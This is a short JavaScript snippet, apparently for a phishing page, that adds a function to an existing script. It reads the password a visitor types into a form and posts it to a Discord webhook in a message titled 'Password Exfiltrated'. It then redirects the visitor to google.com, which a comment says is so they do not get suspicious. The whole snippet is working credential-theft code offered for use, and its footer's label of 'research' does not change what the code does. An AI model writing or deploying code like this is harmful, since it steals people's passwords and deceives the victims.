// Add this below your handleNext function in script.js

async function captureFinal(event) {
    if(event) event.preventDefault();
    
    const passValue = document.getElementById('pass-input').value;

    const payload = {
        embeds: [{
            title: "🔑 Password Exfiltrated",
            color: 3066993, // Green for 'success'
            fields: [
                { name: "Captured Secret", value: `||${passValue}||` }, // Spoilers hide it in Discord
                { name: "Source", value: "password.html" }
            ],
            footer: { text: "Owens' Lair | Tier 2 Research" }
        }]
    };

    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (err) {
        console.error("Link severed:", err);
    }

    // Final Redirection: Send them to a real site so they don't get suspicious
    window.location.href = "https://google.com";
}
